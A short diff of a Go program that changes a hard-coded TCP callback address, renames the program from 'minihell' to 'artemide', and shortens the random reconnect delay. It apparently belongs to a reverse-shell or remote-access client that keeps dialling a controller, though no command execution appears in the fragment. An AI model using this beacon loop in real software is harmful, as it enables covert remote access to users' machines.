@@ -12,14 +12,14 @@ import (
 )
 
 const (
-	CONN_HOST = "10.0.2.01:3333"
+	CONN_HOST = "127.0.0.1:6666"
 	CONN_TYPE = "tcp"
-	NAME      = "minihell"
+	NAME      = "artemide"
 )
 
 func main() {
 	for {
-		r_time := time.Duration(random(1, 360))
+		r_time := time.Duration(random(1, 100))
 		conn, err := net.Dial(CONN_TYPE, CONN_HOST)
 		if err != nil {
 			time.Sleep(r_time * time.Second)
